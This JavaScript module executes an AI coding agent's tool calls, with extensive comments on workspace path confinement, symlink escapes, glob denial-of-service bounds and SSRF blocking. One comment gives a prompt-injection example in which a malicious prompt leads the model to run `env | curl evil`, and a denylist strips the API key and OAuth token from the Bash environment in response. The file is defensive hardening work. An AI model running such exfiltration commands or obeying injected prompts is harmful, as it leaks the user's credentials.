/**
 * Dispatch a tool_use block from the model to the local executor that
 * implements it. Owns the result shape: returns `{ content, isError }`
 * matching what gets put inside a `tool_result` content block sent
 * back to the API on the next turn.
 *
 * All tools are gated through the caller's permission flow before this
 * runs — by the time we get here, the user has approved the call (or
 * the session is in `auto` mode which auto-approves). We don't do
 * permission gating in here; this module is execution only.
 *
 * Path safety is enforced for file tools by validateRawPathWithinCwd from
 * ws-file-ops/common.js — every file_path is resolved COMPONENT BY COMPONENT
 * (open(2)-faithfully) and confirmed to be inside the session cwd before any
 * read/write happens. Symlink escapes — including a `..` that follows a
 * symlinked component (#6923) — are blocked by walking the RAW path rather than
 * a pre-`resolve()`d one (see common.js + the 2026-04-11 production-readiness
 * audit).
 */

import { join } from 'node:path'
import { opendir } from 'node:fs/promises'
import { isIP } from 'node:net'
import { lookup as dnsLookup } from 'node:dns/promises'
import { validateRawPathWithinCwd } from './ws-file-ops/common.js'
import { executeBash, DEFAULT_BASH_TIMEOUT_MS } from './built-in-tools/bash-exec.js'
import { readFileTool, writeFileTool, editFileTool } from './built-in-tools/file-ops.js'
import {
  GLOB_PATTERN_SHELL_METACHARS,
  globPatternEscapeReason,
  globPatternEscapeMessage,
  globPatternComplexityReason,
  globPatternComplexityMessage,
  buildGrepArgs,
  buildGrepCommand,
} from './built-in-tools/tool-transforms.js'
import { TODO_STATUSES, BUILTIN_TOOL_NAMES } from './byok-tools.js'
// #4186: SSRF block-list lives in its own module so the (ip, expected)
// table can grow without bloating this file's WebFetch integration tests.
// The exported helpers retain the same names as the original locals so
// the call sites below read identically.
import { isPrivateOrSpecialIp } from './ssrf-guard.js'

/**
 * Cap on Bash timeout the model can request. 10 minutes is the same
 * ceiling chroxy's Bash tool uses elsewhere — long enough for a slow
 * test suite, short enough to not strand a session if a runaway loop
 * hangs.
 */
const BASH_TIMEOUT_CEILING_MS = 600_000

/**
 * Two bounds, because they do different jobs.
 *
 * `GLOB_COLLECT_CEILING` is the memory backstop on the walk. `GLOB_MAX_MATCHES`
 * is how many paths the model is shown. Collecting more than we return is what
 * makes truncation a SORTED PREFIX rather than an arbitrary subset — and that
 * distinction was a real defect, not a nicety: with a single 10 000 cap on an
 * unsorted traversal, `Glob **\/*.ts` over a 20 000-file tree returned 10 000
 * paths, `isError: false`, no marker, and `d00`–`d09` — half the tree, the
 * alphabetically-first half — simply absent. A model would conclude those
 * directories contain no TypeScript.
 */
const GLOB_COLLECT_CEILING = 50_000
const GLOB_MAX_MATCHES = 10_000

/**
 * #7901 — a second, independent bound on the self-implemented walk, distinct
 * from `GLOB_COLLECT_CEILING` (which bounds MATCHES) and from the wall-clock
 * deadline below (the primary defense — see `walkGlob`'s doc). This bounds
 * total filesystem ENTRIES visited regardless of how many matched, closing
 * the gap where a pattern matches almost nothing across an enormous tree (the
 * exact shape #7356 measured: 200,000 files, near-zero matches) — the collect
 * ceiling never engages there, and on a fast disk the walk could visit many
 * millions of entries before the 30s deadline fires. 2,000,000 is far above
 * any tree this test suite or a real workspace plausibly has (the largest
 * fixture in this file is 15,000 files); it exists as a backstop, not the
 * primary bound.
 *
 * Read per call and overridable via `CHROXY_GLOB_MAX_ENTRIES`, the same shape
 * as `globTimeoutMs`/`CHROXY_GLOB_TIMEOUT_MS` just below — for the same
 * reason: a guard nothing can lower to a testable size is a guard nobody
 * proved fires (docs/false-safety-guards.md). An empty or unparseable value
 * falls back to the 2,000,000 default rather than disabling the bound.
 */
const GLOB_MAX_ENTRIES_VISITED_DEFAULT = 2_000_000
function globMaxEntriesVisited() {
  const raw = (process.env.CHROXY_GLOB_MAX_ENTRIES || '').trim()
  if (!/^\d+$/.test(raw)) return GLOB_MAX_ENTRIES_VISITED_DEFAULT
  const n = Number(raw)
  return n > 0 ? n : GLOB_MAX_ENTRIES_VISITED_DEFAULT
}

/**
 * Wall-clock bound on a Glob walk. Matches the 30s `executeBash` timeout the
 * shell implementation had — dropping the subprocess dropped its kill, and
 * `fs.glob` honours no AbortSignal of its own.
 *
 * Read per call, not at module load, and overridable via
 * `CHROXY_GLOB_TIMEOUT_MS`. That knob is what lets the timeout be PROVEN: a
 * test asserting a 30s bound by waiting 30s does not get written, and a test
 * that only checks the happy path is a guard whose success and whose absence
 * look identical (docs/false-safety-guards.md). A very large monorepo wanting
 * a longer budget is the secondary use.
 */
const GLOB_TIMEOUT_DEFAULT_MS = 30_000
function globTimeoutMs() {
  // Trim and require a NON-EMPTY, strictly positive integer, matching every
  // other env-timeout parser in this package (config.js, prompt-evaluator.js,
  // claude-tui-session.js). The first cut used `Number(raw) >= 0`, and
  // `Number('') === 0`: an exported-but-empty `CHROXY_GLOB_TIMEOUT_MS=` — what
  // a bare `.env` line and `docker run -e VAR` both produce — gave every Glob
  // call a 0 ms budget and disabled the tool outright, with nothing pointing at
  // the cause. The knob exists to make the timeout testable; it must not be a
  // way to switch Glob off by accident.
  const raw = (process.env.CHROXY_GLOB_TIMEOUT_MS || '').trim()
  if (!/^\d+$/.test(raw)) return GLOB_TIMEOUT_DEFAULT_MS
  const n = Number(raw)
  return n > 0 ? n : GLOB_TIMEOUT_DEFAULT_MS
}

/**
 * Env vars the model must NEVER see in a Bash subprocess. Centrally
 * the BYOK API key — if a malicious prompt induces the model to run
 * `env | curl evil`, the model exfiltrates the user's API credentials
 * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
 * own per-session secrets that are scoped to the WS auth surface.
 *
 * Note: we do NOT redact every var that looks like a secret (e.g.
 * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
 * their shell — they're the workspace owner. Only redact chroxy-
 * specific credentials the model has no business reading.
 */
const SECRET_ENV_DENYLIST = new Set([
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
])

/**
 * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
 * own secrets. Returns a plain object — pass to executeBash's `env`.
 */
function buildSafeBashEnv() {
  const out = {}
  for (const [k, v] of Object.entries(process.env)) {
    if (SECRET_ENV_DENYLIST.has(k)) continue
    out[k] = v
  }
  return out
}

/**
 * Dispatch a single tool_use block.
 *
 * @param {object} args
 * @param {string} args.toolName       The tool name from the model
 * @param {object} args.input          The tool's input arguments (already parsed JSON)
 * @param {string} args.cwd            Session cwd — anchor for path safety
 * @param {Map} args.cwdRealCache      Per-session cache of resolved real paths
 * @param {number} args.cwdCacheTtl    Cache TTL in ms
 * @param {AbortSignal} [args.signal]  Optional abort signal — Bash exec listens
 * @param {Map}         [args.todoStore]  Per-session TodoWrite list (id → item)
 * @returns {Promise<{ content: string, isError: boolean }>}
 */
export async function executeBuiltinTool({
  toolName,
  input,
  cwd,
  cwdRealCache,
  cwdCacheTtl,
  signal,
  todoStore,
}) {
  try {
    switch (toolName) {
      case 'Read':
        return await runRead({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Write':
        return await runWrite({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Edit':
        return await runEdit({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Bash':
        return await runBash({ input, cwd, signal })
      case 'Glob':
        return await runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'Grep':
        return await runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'WebFetch':
        return await runWebFetch({ input, signal })
      case 'TodoWrite':
        return runTodoWrite({ input, todoStore })
      default: {
        // Derive the list from BUILTIN_TOOL_NAMES so adding a tool only
        // requires updating byok-tools.js — this message can't drift.
        const known = [...BUILTIN_TOOL_NAMES].sort().join(', ')
        return {
          content: `Unknown tool: ${toolName}. The claude-byok provider ships with: ${known}. MCP and other tools land in follow-up issues.`,
          isError: true,
        }
      }
    }
  } catch (err) {
    // Anything that escapes the per-tool runner becomes an error
    // tool_result so the model can see what went wrong and possibly
    // recover. The error message is sanitized — no stack traces, just
    // the error message line.
    return {
      content: `Tool ${toolName} failed: ${err?.message || String(err)}`,
      isError: true,
    }
  }
}

/** Resolve a tool-supplied path against cwd, then validate it's inside. */
async function safeResolve(filePath, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof filePath !== 'string' || filePath.length === 0) {
    throw Object.assign(new Error('file_path is required'), { code: 'EINVAL' })
  }
  // #6923 — hand the RAW filePath (its `..` intact) to the component-wise walker.
  // Do NOT pre-`resolve(cwd, filePath)`: `resolve()` collapses a `..` that follows
  // a symlinked component LEXICALLY, so `link/../x` cancelled the symlink before it
  // was followed and an escape via a symlink-out-of-workspace + `..` looked in
  // bounds. validateRawPathWithinCwd walks the raw path open(2)-faithfully so the
  // true (escaping) destination is seen and rejected.
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    filePath,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${filePath} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

async function runRead({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await readFileTool({
    filePath: realPath,
    offset: input?.offset,
    limit: input?.limit,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  const tail = result.truncatedByLimit
    ? `\n\n[showed ${result.linesReturned} of ${result.totalLines} lines]`
    : ''
  return { content: result.content + tail, isError: false }
}

async function runWrite({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await writeFileTool({
    filePath: realPath,
    content: input?.content,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Wrote ${result.bytesWritten} bytes to ${input.file_path}${result.created ? ' (created)' : ''}.`,
    isError: false,
  }
}

async function runEdit({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await editFileTool({
    filePath: realPath,
    oldString: input?.old_string,
    newString: input?.new_string,
    replaceAll: input?.replace_all === true,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Replaced ${result.replacements} occurrence(s) in ${input.file_path}.`,
    isError: false,
  }
}

async function runBash({ input, cwd, signal }) {
  const command = input?.command
  if (typeof command !== 'string' || command.length === 0) {
    return { content: 'EINVAL: command is required', isError: true }
  }
  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, BASH_TIMEOUT_CEILING_MS)
    : DEFAULT_BASH_TIMEOUT_MS

  const result = await executeBash({
    command,
    cwd,
    timeoutMs,
    signal,
    env: buildSafeBashEnv(),
  })

  // Build a single text payload — stdout, then stderr (if any), then a
  // status line. The model is the consumer here, so we err on the side
  // of being verbose about timing and exit state.
  const parts = []
  if (result.stdout) parts.push(`stdout:\n${result.stdout}`)
  if (result.stderr) parts.push(`stderr:\n${result.stderr}`)
  const statusBits = []
  if (result.timedOut) statusBits.push(`timed out after ${timeoutMs}ms`)
  if (result.aborted) statusBits.push('aborted')
  if (result.truncated) statusBits.push('output truncated at cap')
  statusBits.push(`exit=${result.exitCode ?? 'killed'}`)
  if (result.signal) statusBits.push(`signal=${result.signal}`)
  statusBits.push(`${result.durationMs}ms`)
  parts.push(`[${statusBits.join(', ')}]`)

  return {
    content: parts.join('\n\n'),
    isError: result.exitCode !== 0 || result.timedOut || result.aborted,
  }
}

// Characters in a glob pattern that allow shell-side command substitution
// or piping (GLOB_PATTERN_SHELL_METACHARS + the command builders live in the
// shared tool-transforms.js, so the host and the docker-byok container reject
// and shell out identically — #4070 / #5882).

async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  if (GLOB_PATTERN_SHELL_METACHARS.test(pattern)) {
    return {
      content: 'EINVAL: glob pattern contains shell-dangerous characters ($, `, ;, |, &, <, >, (, ), \\, newline)',
      isError: true,
    }
  }
  // #7341 — the metachar denylist above closes shell INJECTION only; it says
  // nothing about where the glob expands to. Containment is a separate rule.
  const escapeReason = globPatternEscapeReason(pattern)
  if (escapeReason) {
    return { content: globPatternEscapeMessage(escapeReason), isError: true }
  }
  // #7898 round 4 — neither check above bounds `pattern`'s length or brace
  // nesting, and every round of this PR's review has found a new way an
  // unbounded pattern makes the segment matcher (parseSegmentTokens/
  // segmentMatches, driving both compileCaseCheck's callers and walkGlob's
  // own per-entry matching below) slow or crash. See the worst-case bound
  // written above compileCaseCheck and globPatternComplexityReason's own doc
  // for the specific measured failures this closes.
  const complexityReason = globPatternComplexityReason(pattern)
  if (complexityReason) {
    return { content: globPatternComplexityMessage(complexityReason), isError: true }
  }

  // Realpath-validate the search ROOT against cwd. Pre-fix this was a
  // weak "no ..." check that let absolute paths to /etc through.
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // #7341 — if the pattern NAMES a directory outright and that directory
  // resolves outside the workspace, say so instead of returning "No matches".
  //
  // Containment itself is unchanged: every match is still confined below, and
  // a symlink the caller merely DISCOVERED through a wildcard is still withheld
  // in silence, because naming it would be the existence oracle that silence
  // exists to prevent. This is the other case. When the caller writes
  // `node_modules/**` and `node_modules` is a symlink into a pnpm store, a
  // shared `.venv`, or a sibling repo, "No matches" is a baffling answer to a
  // question the caller already knew the shape of — and it leaks nothing,
  // because passing the very same path as `input.path` ALREADY returns exactly
  // this error. It also makes `pattern` and `path` consistent rather than
  // mysteriously different for the same directory.
  const literalPrefix = literalDirPrefix(pattern)
  if (literalPrefix) {
    await safeResolveRoot(literalPrefix, realRoot, cwdRealCache, cwdCacheTtl)
  }

  // Check the signal BEFORE the walk: the in-loop check is only reached when
  // the walk yields, so an already-aborted call on a pattern that matches
  // nothing used to run the whole tree and then report a cheerful "No matches".
  // The container Glob has always had this pre-check; the host lacked it, which
  // made the two backends answer differently for identical input.
  if (signal?.aborted) return { content: 'Glob interrupted', isError: true }

  // #7901 — the host no longer calls `fs.glob` (`node:fs/promises`'s `glob()`)
  // at all. Its own segment matcher backtracks catastrophically on the exact
  // pattern shapes `compileCaseCheck`'s DP was rewritten to handle safely
  // (#7898) — measured 87 SECONDS for `*a*a*a*a*a*a*a*a*a*a*b.ts` against one
  // 40-character near-miss real name, synchronously, no chroxy code involved,
  // which froze the WHOLE DAEMON's event loop (every session, every WS
  // client, the tunnel health checks) for the duration and which the 30s
  // walk-timeout race below cannot interrupt (the timer cannot fire while the
  // event loop it depends on is the thing blocked). `fs.glob` also honours no
  // AbortSignal (#7356 — an aborted or timed-out call left the walk running,
  // unbounded, after the tool result was already sent) and hard-codes
  // case-INSENSITIVE candidate generation on macOS/Windows with a
  // candidate-generation bug for negated bracket classes (#7899) that a
  // post-hoc case re-check over its candidates could never recover, because
  // the candidate fs.glob needed to produce in the first place was never
  // generated.
  //
  // `walkGlob` below replaces it with a self-implemented `fs.promises.opendir`
  // walk: at each real directory, it tracks which pattern-segment positions
  // ("matchers", from `compileCaseCheck` — the SAME non-backtracking DP #7898
  // added) are still reachable, and tests every real directory entry against
  // them via `segmentMatches` — case-sensitively BY CONSTRUCTION, since it
  // compares pattern text to the REAL on-disk name at the moment `opendir`
  // reads it, never a candidate `fs.glob` echoed back. Confinement
  // (`validateRawPathWithinCwd`, #6923's shared componentwise resolver) is
  // checked before the walk either descends into, or reports a match for, any
  // symlinked entry — so an out-of-bounds symlinked directory is never even
  // opened, which is strictly stronger than the old post-hoc filter that
  // enumerated it via `fs.glob` first and discarded the result afterward. The
  // deadline/abort race below checks in with the walk at every directory
  // entry (an `opendir` read is a real, yielding async operation), so the
  // event loop keeps turning throughout, and stopping the walk is a matter of
  // setting a flag the walk's own loop observes on its very next iteration —
  // not, as with `fs.glob`, hoping a signal it ignores gets noticed.
  const { matchers } = compileCaseCheck(pattern)
  const files = []
  // ONE timer sets the flag and releases the race, so the two cannot resolve
  // in either order — a second, independent timer would let the race finish
  // before `state.stop` was assigned and report success on a timed-out walk.
  // The abort listener shares that single release for the same reason.
  const state = { stop: null, visited: 0 }
  let releaseDeadline
  const deadlineReached = new Promise((resolve) => { releaseDeadline = resolve })
  const timeoutMs = globTimeoutMs()
  const maxEntries = globMaxEntriesVisited()
  const deadline = setTimeout(() => { state.stop = 'timed out'; releaseDeadline() }, timeoutMs)
  deadline.unref?.()
  const onAbort = () => { state.stop = 'interrupted'; releaseDeadline() }
  signal?.addEventListener?.('abort', onAbort, { once: true })
  const collect = walkGlob({ realRoot, matchers, cwdRealCache, cwdCacheTtl, state, results: files, maxEntries })
  // Attach a catch BEFORE the race: if the walk rejects after the deadline has
  // already settled it, the rejection would otherwise be unhandled.
  let walkError = null
  collect.catch((err) => { walkError = err })
  try {
    await Promise.race([collect, deadlineReached])
  } catch (err) {
    walkError = err
  }
  clearTimeout(deadline)
  signal?.removeEventListener?.('abort', onAbort)
  if (walkError) {
    return { content: `Glob failed: ${walkError?.message || String(walkError)}`, isError: true }
  }
  if (state.stop === 'timed out') {
    return { content: `Glob timed out after ${timeoutMs}ms`, isError: true }
  }
  if (state.stop === 'interrupted') return { content: 'Glob interrupted', isError: true }
  if (state.stop === 'too many entries') {
    return {
      content: `Glob visited more than ${maxEntries} filesystem entries without finishing — narrow the pattern or use "path"`,
      isError: true,
    }
  }
  // #7357 — a match containing an embedded newline cannot be told apart, in a
  // '\n'-joined text result, from two separate matches: `sub/deep/nl\nSECRET`
  // reads back as `sub/deep/nl` and `SECRET` on two lines, and the second of
  // those is a path that does not exist as spelled. NUL is the only byte a
  // POSIX filename cannot contain, but the tool_result handed back to the
  // model is plain '\n'-joined text (not NUL-delimited), so there is no
  // encoding that stays both unambiguous AND a single text line. Dropping is
  // the one option of the two the issue names ("emitted unambiguously or
  // skipped, never split") that needs no new escape syntax for the model to
  // learn, and it is applied identically here and in the container path
  // (docker-byok-session.js's `_containerGlob`) so the two backends agree on
  // what "the same input" means. This is a display-format decision, not a
  // containment one — the match is not a security-relevant withholding, so it
  // gets no daemon-log line the way an escaping match does.
  let kept = files.filter((f) => !f.includes('\n'))
  // A withheld match is reported as no match, with no count and no marker.
  // Anything that distinguishes "matched, but outside" from "matched nothing"
  // is an existence ORACLE: a workspace that contains `esc -> /` turns one bit
  // per call into filesystem enumeration, on a tool that is auto-approved in
  // `acceptEdits`. The confinement is proven by tests, not by a runtime marker.
  if (kept.length === 0) return { content: `No matches for ${pattern}`, isError: false }

  // Sort. Every shell glob does, and `walkGlob` yields in filesystem
  // traversal order (deterministic-but-different from a shell's, same as the
  // old `fs.glob`-based walk was), which would reshuffle the whole listing for
  // a one-file change and destroy the alphabetical grouping that makes a long
  // result readable.
  kept.sort()

  // TRUNCATION IS ANNOUNCED. The oracle argument that justifies silence for
  // withheld matches does not apply here: a count of in-workspace matches
  // reveals nothing about anything outside it, and silently dropping paths
  // makes Glob wrong by omission with nothing to tell the model.
  if (kept.length > GLOB_MAX_MATCHES) {
    const total = files.length >= GLOB_COLLECT_CEILING ? `${kept.length}+` : `${kept.length}`
    const shown = kept.slice(0, GLOB_MAX_MATCHES)
    shown.push(`[truncated: showing ${GLOB_MAX_MATCHES} of ${total} matches — narrow the pattern or use "path"]`)
    return { content: shown.join('\n'), isError: false }
  }
  return { content: kept.join('\n'), isError: false }
}

/**
 * #7901 — the self-implemented replacement for `fs.glob`'s own walk+match.
 * Walks `realRoot` one real directory at a time via `fs.promises.opendir`,
 * tracking which positions in `matchers` (from `compileCaseCheck`) are still
 * reachable — the same array-wildcard DP `caseCheckPasses` already runs
 * post-hoc over a KNOWN full path, here computed INCREMENTALLY, one real
 * directory level at a time, so it can decide which subdirectories are worth
 * opening at all instead of enumerating everything and filtering afterward.
 *
 * `active`/`next` are boolean arrays of length `matchers.length + 1`; index
 * `k` means "matchers[0..k) have successfully aligned with every real
 * segment consumed so far". `closeGlobstars` propagates a `**` matcher's
 * "matches zero segments" case (so `k` reachable via a `**` at position `k`
 * makes `k+1` reachable too, with no directory read needed) — the same
 * prefix-OR trick `caseCheckPasses` uses for `**`, just applied as the walk
 * descends instead of after the fact.
 *
 * MATCH: whenever `next[matchers.length]` is true for an entry, the pattern
 * is fully satisfied — that entry (file or directory, matching `fs.glob`'s
 * own behavior of returning either) is a result. DESCEND: whenever `next` has
 * any true bit at an index below `matchers.length`, there is a still-
 * incomplete (or still-`**`-absorbing) alignment that a deeper real segment
 * could complete, so a directory (or a symlink that might resolve to one) is
 * opened; an ordinary file never is, at zero extra cost.
 *
 * SECURITY (#7341/#6923, carrying forward into #7901) — a symlinked entry is
 * realpath-validated against `realRoot` via the shared componentwise resolver
 * BEFORE it is either reported as a match or descended into. An entry whose
 * real target resolves outside the workspace is withheld silently (never
 * matched, never opened) — stronger than the predecessor's post-hoc filter,
 * which let `fs.glob` enumerate an out-of-bounds symlinked directory's
 * contents first and discarded the result afterward; this walk never opens
 * it. FAIL-CLOSED: a symlink that cannot be resolved (ELOOP, EACCES, a depth
 * bomb) is withheld the same way. An ordinary (non-symlink) directory reached
 * by descending from an already-validated point needs no re-check — its real
 * path is trivially `join(parent, name)`, since nothing in the chain from
 * `realRoot` down to it was ever a symlink.
 *
 * SECURITY (#7355/#7899) — case-sensitive by construction: every comparison
 * is `segmentMatches(matcher, dirent.name)` against the REAL name `opendir`
 * just read, never a pattern-echoed candidate, so there is no case-folding
 * layer left to disagree with (host and container Glob, and Claude Code's own
 * Glob, now agree on every pattern shape a fuzz found disagreement on,
 * negated bracket classes included — `segmentMatches`/`advanceToken` never
 * had a nocase mode to begin with).
 *
 * DOT HANDLING — `**` and a bare wildcard/class token never stand for a real
 * segment's leading dot (`advanceToken`'s dot guard, `parseSegmentTokens`'s
 * doc), matching `fs.glob`'s own observed default exactly (verified directly
 * against Node 22's `glob()`): `.env*` and `.[a-z]*` still find `.envrc`,
 * `*.ts`/`?env`/most bracket classes do not, and `**`/`*` never descend into
 * or list a dotfile/dotdir at any depth unless a pattern segment explicitly
 * spells a leading literal dot for that level.
 *
 * BOUNDS — the caller's deadline/abort race is checked (`state.stop`) at the
 * top of every directory and before every entry, so an `opendir` read (a
 * real, yielding async op) is never more than one entry away from noticing a
 * stop. `GLOB_COLLECT_CEILING` bounds MATCHES the same way the old walk did;
 * `maxEntries` (`globMaxEntriesVisited()`) additionally bounds total entries
 * VISITED regardless of match count, for the #7356 shape (an enormous tree, almost no
 * matches) where the collect ceiling never engages.
 *
 * @param {{realRoot: string, matchers: Array, cwdRealCache: Map, cwdCacheTtl: number, state: {stop: string|null, visited: number}, results: string[], maxEntries: number}} args
 */
async function walkGlob({ realRoot, matchers, cwdRealCache, cwdCacheTtl, state, results, maxEntries }) {
  const m = matchers.length

  function closeGlobstars(active) {
    for (let k = 0; k < m; k++) {
      if (active[k] && matchers[k] === CASE_CHECK_GLOBSTAR) active[k + 1] = true
    }
    return active
  }

  function shouldStop() {
    return state.stop !== null || results.length >= GLOB_COLLECT_CEILING
  }

  async function walk(dirAbs, relPrefix, active) {
    if (shouldStop()) return
    let dh
    try {
      dh = await opendir(dirAbs)
    } catch {
      return // unreadable or gone — FAIL CLOSED: no children found, never a crash
    }
    try {
      for await (const dirent of dh) {
        if (shouldStop()) return
        state.visited++
        if (state.visited > maxEntries) { state.stop = 'too many entries'; return }

        const name = dirent.name
        const next = new Array(m + 1).fill(false)
        for (let k = 0; k < m; k++) {
          if (!active[k]) continue
          if (matchers[k] === CASE_CHECK_GLOBSTAR) {
            // `**` never absorbs a hidden entry — see parseSegmentTokens's DOT
            // HANDLING doc; matches fs.glob's own default (a bare `**` never
            // lists a dotfile/dotdir at any depth).
            if (name[0] !== '.') next[k] = true
          } else if (segmentMatches(matchers[k], name)) {
            next[k + 1] = true
          }
        }
        closeGlobstars(next)

        // #7901 round 2 (Windows parity) — `join()`, not a hardcoded `/`, so
        // the result carries the PLATFORM-native separator (`\` on Windows),
        // matching what the pre-#7901 walk returned via `path.relative()`
        // (also platform-native) rather than silently switching Windows Glob
        // results from `sub\file.ts` to `sub/file.ts`. `join('', name)`
        // collapses to plain `name` (verified: no leading separator), so this
        // needs no separate empty-prefix branch.
        const relPath = join(relPrefix, name)
        const isSymlink = dirent.isSymbolicLink()
        let childAbs
        if (isSymlink) {
          let resolved
          try {
            resolved = await validateRawPathWithinCwd(relPath, realRoot, cwdRealCache, cwdCacheTtl)
          } catch {
            resolved = null // FAIL CLOSED — ELOOP, EACCES, etc. withhold, never trust
          }
          if (!resolved || !resolved.valid) continue
          childAbs = resolved.realPath
        } else {
          childAbs = join(dirAbs, name)
        }

        if (next[m]) results.push(relPath)
        if (shouldStop()) return

        let canContinuePattern = false
        for (let k = 0; k < m; k++) { if (next[k]) { canContinuePattern = true; break } }
        if (canContinuePattern && (dirent.isDirectory() || isSymlink)) {
          await walk(childAbs, relPath, next)
        }
      }
    } finally {
      await dh.close().catch(() => {})
    }
  }

  const initial = new Array(m + 1).fill(false)
  initial[0] = true
  closeGlobstars(initial)
  await walk(realRoot, '', initial)
}

/**
 * #7355 — parse a single glob PATTERN SEGMENT (no `/`) into a token array for
 * {@link segmentMatches}. Scope is exactly the syntax
 * {@link GLOB_PATTERN_SHELL_METACHARS} lets through to `fs.glob`: `*`, `?`,
 * `[...]`/`[!...]`/`[^...]` bracket expressions (with `-` ranges), and
 * `{a,b}` brace alternation (recursive — an alternative may itself contain
 * any of the above, including nested braces). No backslash escapes: `\` is
 * rejected from every Glob pattern upstream, so none are interpreted here
 * either — every other character is a literal.
 *
 * #7898 (this fix) — this used to compile straight to a `RegExp` (`*`/`?` as
 * `[\s\S]*`/`[\s\S]`, `{a,b}` as `(?:a|b)`), tested via `RegExp#test` in
 * {@link caseCheckPasses}. That is a BACKTRACKING regex: a segment shaped
 * like `*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b` tested against a REAL
 * on-disk name that almost-but-doesn't match (`'a'.repeat(n)`, no trailing
 * `b`) is the textbook catastrophic-backtracking shape — measured: 0.03ms at
 * n=20, 811ms at n=30, 5.9s at n=32, and it only gets worse from there (each
 * +2 chars roughly 7-8x's the previous run). This check runs SYNCHRONOUSLY,
 * once per real directory entry `walkGlob` (#7901) reads, interleaved with
 * `runGlob`'s own 30s walk-timeout race rather than after it — but a single
 * over-budget call would still block the event loop for its own duration
 * regardless of the race around it, so nothing upstream of the complexity cap
 * below may assume this check is cheap. `**`-count no longer fails this class
 * of pattern closed before reaching the regex either (that was this exact
 * defect class's OWN prior fix, in this same commit, removing the `ambiguous`
 * short-circuit for 2+ `**` segments) — so every pattern shape now reaches
 * this segment matcher, which is why it has to be safe on its own rather than
 * relying on an upstream fail-closed path to shield it.
 *
 * The replacement is a token list consumed by an iterative, non-backtracking
 * DP ({@link segmentMatches}) — the same technique {@link caseCheckPasses}
 * already uses one level up for `**` across path segments, just applied one
 * level down, per CHARACTER, to `*`/`?` within a single segment. Verified
 * behaviorally identical to the former regex compiler across 20,000 random
 * (pattern, string) pairs before this fix landed, and safe: n=5000 against
 * the exact pathological pattern above now takes ~5ms, not "does not finish".
 *
 * `*`/`?` match a literal newline within a segment too (a filename may
 * legally contain one — see #7357): the DP advances by testing `str[j]`
 * directly against no character at all (`any`/`star`), never through a `.`-
 * style regex metachar that would need `[\s\S]` to include `\n` — matching
 * every character, newlines included, needs no special-casing here.
 *
 * DOT HANDLING (#7901) — added when `walkGlob` became this matcher's OWN
 * candidate source rather than a post-hoc re-check over candidates `fs.glob`
 * already filtered. `fs.glob`'s default (verified directly against Node 22's
 * `glob()`) never lets a bare `*`, `?`, or an ordinary bracket class stand for
 * a REAL segment's leading dot: `*.ts` does not match `.env`, `?env` does
 * not, `[.a]env`/`[a.]env` (a class with more than one member, even when `.`
 * is one of them) does not, `[^a]env`/`[!a]env` (a negated class that would
 * incidentally accept `.` under ordinary regex semantics) does not — only a
 * LITERAL leading `.` (`.env*`, `.[a-z]*`) reaches a dotfile, with exactly one
 * observed exception: `[.]` — a non-negated class whose SOLE member is a
 * literal dot — is privileged the same as a literal `.` (`[.]env` matches
 * `.env`); a class with any other member alongside the dot is not. This is
 * encoded as `soleDot` on a `class` token ({@link parseBracketExpr}) and
 * enforced by {@link advanceToken}'s dot guard, which triggers ONLY at real
 * offset 0 — everywhere else a `.` is an ordinary character, matched like any
 * other. `**` gets no such exception ever (it carries no literal text of its
 * own to be "explicit" with): see {@link walkGlob}'s own dot check.
 */
function parseSegmentTokens(seg) {
  const tokens = []
  let i = 0
  while (i < seg.length) {
    const c = seg[i]
    if (c === '*') {
      tokens.push({ t: 'star' })
      i++
    } else if (c === '?') {
      tokens.push({ t: 'any' })
      i++
    } else if (c === '[') {
      const parsed = parseBracketExpr(seg, i)
      if (parsed) {
        // A bracket class only ever tests ONE character at a time (see
        // `advanceToken`'s 'class' arm) — a single-char regex test can never
        // backtrack, so reusing RegExp here for the class body is safe,
        // unlike compiling the WHOLE segment (including `*`/`?` runs) to one.
        //
        // #7898 round 3 — `parseBracketExpr` accepts any `-`-range TEXT
        // (`[z-a]`, `[9-0]`, `[b-!a!x]` from combining adjacent special
        // characters) without checking the range is in order; JS's `RegExp`
        // constructor rejects an out-of-order range (`Range out of order in
        // character class`) and THROWS, synchronously, from inside
        // `compileCaseCheck` — which runs unconditionally, for every Glob
        // call whose pattern has a bracket segment, before a single directory
        // entry is even read (`runGlob` calls it up front). Nothing between
        // here and `executeBuiltinTool` catches it, so an ordinary "No
        // matches" (confirmed empirically: `fs.glob` itself tolerates
        // `[z-a]bc.ts` and simply matches nothing, it does not throw) turns
        // into a surfaced `Tool Glob failed: Invalid regular expression...`
